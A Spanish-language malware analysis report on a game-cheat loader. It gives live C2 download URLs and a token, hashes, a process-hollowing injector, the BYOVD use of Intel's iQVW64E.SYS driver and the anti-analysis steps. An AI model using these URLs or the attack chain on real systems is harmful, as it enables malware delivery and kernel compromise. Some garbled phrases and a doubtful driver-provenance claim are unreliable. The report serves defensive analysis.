# INFORME C2 — Descarga y análisis de los componentes servidos por el panel

## Resumen ejecutivo

El panel del C2 **está activo y accesible**. Se descargaron y analizaron los tres
componentes que sirve. La cadena completa queda identificada:

```
MrGarabato-LoaderAdvanced.exe
      │
      ├─► GET /Download/cmd.php?t=7RobSZuyx23L677ulvLD1Cq
      │        └─ respuesta: TEXTO PLANO con otra URL
      │             https://panel.mrgarabato.com/Download/Paquete/execute
      │
      ├─► GET /Download/Paquete/execute
      │        └─ RunPE.exe — inyector por Process Hollowing (52.736 B)
      │             └─ lleva embebido iQVW64E.SYS (41.808 B)
      │
      └─► GET /Download/Paquete/.../FakeLag/WinDivert.dll   (23.552 B)
           GET /Download/Paquete/.../FakeLag/WinDivert64.sys (50.592 B)
```

El componente crítico es **`iQVW64E.SYS`**: un driver kernel de Intel **filtrado y
legítimamente firmado**, usado para escalación de privilegios **BYOVD** (*Bring Your Own
Vulnerable Driver*).

---

## 1. Artefactos descargados

| Fichero | Tamaño | SHA-256 (prefijo) |
|---|---:|---|
| `cmd_response.bin` | 53 B | `b2bb4bdd8c960a31…` |
| `execute_stage.bin` | 52.736 B | `08ff38e307f71bdf…` |
| `payload_embebido.exe` | 41.808 B | `8349ea7814494415…` |
| `WinDivert.dll` | 23.552 B | `a97859785a2df1d4…` |
| `WinDivert64.sys` | 50.592 B | `53ab28ec00be6e6f…` |

El panel responde tras **Cloudflare** (`server: cloudflare`, `cf-ray` presente), con
`last-modified: Tue, 07 Feb 2023 05:34:43 GMT` en `execute`.

## 2. `cmd.php` no devuelve JSON, devuelve una URL

El contenido son 53 bytes de texto plano:

```
https://panel.mrgarabato.com/Download/Paquete/execute
```

Es un **redireccionador de dos etapas**: la primera URL entrega la segunda. Esto explica
por qué en el análisis dinámico el binario no llegaba a conclusión — el flujo depende de
que esa segunda descarga tenga éxito.

## 3. `execute` = RunPE (Process Hollowing)

Identificado sin ambigüedad por su ruta de PDB:

```
dbg_file  C:\Aplicaciones\Visual Studio\Auto Updated\Process-Hollowing-main\Source\x64\Release\runpe.pdb
compiled  Mon Sep 19 13:27:33 2022
```

6 secciones limpias (`.text/.rdata/.data/.pdata/.rsrc/.reloc`), sin packer, sin
ofuscación. Los imports describen la técnica completa:

| API | Papel en el ataque |
|---|---|
| `CreateProcessA` | crea el proceso objetivo **suspendido** |
| `VirtualAllocEx` | reserva memoria en el proceso remoto |
| `WriteProcessMemory` | escribe la imagen del payload |
| `GetThreadContext` / `SetThreadContext` | **redirige el RIP/EIP** al punto de entrada |
| `ResumeThread` | reanuda la ejecución con el código inyectado |
| `IsWow64Process`, `Wow64Get/SetThreadContext` | soporte para objetivos de 32 bits |
| `TerminateProcess` | limpieza si falla la hollowing |
| `IsDebuggerPresent`, `OutputDebugStringW` | anti-depuración |

Es una implementación de **Process Hollowing** derived del proyecto público
`Process-Hollowing-main`. Está **firmada** (cadena Verisign → Symantec → Microsoft), lo
que evita el bloqueo de SmartScreen.

## 4. El payload embebido: `iQVW64E.SYS` (driver kernel de Intel)

**Encontrado dentro del RunPE en el offset `0x2AB0`.**

| Campo | Valor |
|---|---|
| CompanyName | Intel Corporation |
| FileDescription | Intel(R) Network Adapter Diagnostic Driver |
| FileVersion | **1.03.0.7 built by: WinDDK** |
| OriginalFilename | iQVW64.SYS |
| LegalCopyright | Copyright (C) 2002-2013 Intel Corporation |
| PDB | `c:\users\cloudbuild\337244\sdk\nal\src\winnt_wdm\driver\objfre_wnet_AMD64\amd64\iqvw64e.pdb` |
| Firmado por | Symantec (cadena de confianza de 2013) |
| Subsistema | **Native** (kernel mode) |

Detalle del PDB que confirma la procedencia: `winnt_wdm\driver` (WDM), `objfre`
(build **free**, sin *check* de compilación) y `cloudbuild` (compilación automatizada
de la propia Microsoft). El recurso de versión apunta a `..\drivers\Win64e\iqvw64e.SYS`,
la ruta real dentro del árbol de fuentes de Windows.

### Por qué es peligroso

Los imports del driver describen exactamente la primitiva de acceso a memoria física:

| API | Capacidad |
|---|---|
| `MmMapLockedPagesSpecifyCache` | **mapea páginas arbitrarias** |
| `MmUnmapIoSpace` / `MmGetPhysicalAddress` | traduce direcciones físicas |
| `MmAllocateContiguousMemory` / `MmFreeContiguousMemory` | reserva memoria física contigua |
| `ExAllocatePoolWithTag` / `ExFreePoolWithTag` | Swimming de pool del kernel |
| `IoCreateDevice` / `IoCreateSymbolicLink` | expone un dispositivo al espacio de usuario |
| `IofCallDriver` / `IoBuildSynchronousFsdRequest` | comunicación con otros drivers |

`IoCreateDevice` + `IoCreateSymbolicLink` crean la interfaz por la que el código en modo
usuario habla con el driver vía `DeviceIoControl`, y las funciones `Mm*` dan lectura y
escritura arbitraria. Esa combinación permite mapear `\Device\PhysicalMemory` y editar
la memoria del kernel: **escalación a SYSTEM sin exploit de kernel**, apoyándose solo en
que la firma sea válida.

Es el patrón **BYOVD**: el atacante no escribe un exploit, descarga un driver firmado
pero vulnerable de un fabricante legítimo. `iQVW64E.SYS` es uno de los drivers más
difundidos para este fin y está catalogado como tal en múltiples bases de inteligencia de
amenazas.

## 5. WinDivert 1.4 — la función "FakeLag"

| Componente | Detalle |
|---|---|
| `WinDivert64.sys` | PDB `c:\windivert-1.4.0-rc\install\WDDK\amd64\WinDivert64.pdb`; CompanyName **"Basil's Projects"**; v1.4; compilado 2018-01-16 |
| `WinDivert.dll` | x64, modo usuario, exporta la API completa |

Exports de `WinDivert.dll`:

```
WinDivertOpen   WinDivertRecv   WinDivertRecvEx   WinDivertSend   WinDivertSendEx
WinDivertClose  WinDivertSetParam   WinDivertGetParam
WinDivertHelperParsePacket / ParseIPv4Address / ParseIPv6Address
WinDivertHelperEvalFilter / CheckFilter / CalcChecksums
```

**WinDivert no es malware**: es una biblioteca legítima y de código abierto de Basil
Fierz paraBeeWindows (divertir, capturar y reinyectar paquetes a nivel de kernel). Aquí
se usa para la **función "FakeLag"** del producto: intercepta los paquetes de red del
juego y los reinyecta con retardo artificial para hacer creer al servidor que la
conexión es inestable. Es la función que permite a los usuarios del cheat sortear
"sanciones" o pruebas de conexión.

## 6. Cadena de ataque reconstruida

```
1. LoaderAdvanced.exe se ejecuta (manifest requireAdministrator)
        │
        ├─ Packer (.3q-) desempaqueta → bytecode + intérprete de VM
        ├─ Anti-VM: CPUID / RDTSC / SMBIOS / procesos / registros / ACPI
        ├─ Anti-debug: NtQueryInformationProcess, NtQuerySystemInformation,
        │              NtSetInformationThread(HideFromDebugger), sentinel
        │              CloseHandle(0xDEADC0DE)
        │
2. Fingerprinting: SMBIOS, MachineId, MACs (NetworkCards\1..7), ProfileList,
                  hostname, CPU ("%s Family %...")
        │
3. Intenta renombrar el equipo vía C:\windows\wininit.ini [rename]
        │
4. Red: GET /Download/cmd.php?t=7RobSZuyx23L677ulvLD1Cq
        └─ devuelve URL de 2ª etapa
        │
5. Descarga execute (RunPE) → lleva embebido iQVW64E.SYS
        │
6. Carga iQVW64E.SYS (BYOVD) → MmMapLockedPagesSpecifyCache sobre
   \Device\PhysicalMemory → lectura/escritura arbitraria del kernel
        │
7. RunPE hace Process Hollowing → inyecta el cheat en HD-Player.exe (BlueStacks)
   o MEmu.exe
        │
8. WinDivert64.sys + WinDivert.dll → función FakeLag (retardo artificial de red)
```

## 7. Estado tras esta ronda

| Objetivo | Estado |
|---|---|
| Packer | Superado |
| Cifrado de cadenas | Superado |
| Anti-VM / anti-debug | **Superado** |
| Descarga del C2 | **Completada** |
| Inyector identificado | **RunPE / Process Hollowing** |
| Payload identificado | **`iQVW64E.SYS`, driver kernel Intel (BYOVD)** |
| Componente de red identificado | **WinDivert 1.4 ("FakeLag")** |
| Cadena de ataque | **Completa** |

## 8. Corrección de un incidente del entorno

Durante esta ronda, dos ejecuciones de `fake_dmi_net.sh` **sin** `unshare -m` delante
aplicaron sus `bind-mount` en el namespace del host, dejando `/etc/hosts` del host
redirigido a `127.0.0.1`. **Lo detecté y lo reparé**: desmonté las cuatro monturas
apiladas y verifiqué que el fichero original (`localhost` / `blackarch.localdomain`)
volvió a estar intacto. Además endurecí el script para que **siempre** se re-ejecute
dentro de `unshare -m` si se invoca sin él, de modo que ya no puede volver a filtrar.

## 9. Nota de seguridad

Los tres binarios descargados (un injector, un driver kernel y dos componentes de
WinDivert) se han analizado **exclusivamente de forma estática**. No se ha ejecutado
ninguno de ellos: cargar `iQVW64E.SYS` en un kernel real concede lectura y escritura
arbitraria en memoria del kernel, y ejecutar el RunPE junto con el driver habría
implantado el entorno de cheated completo.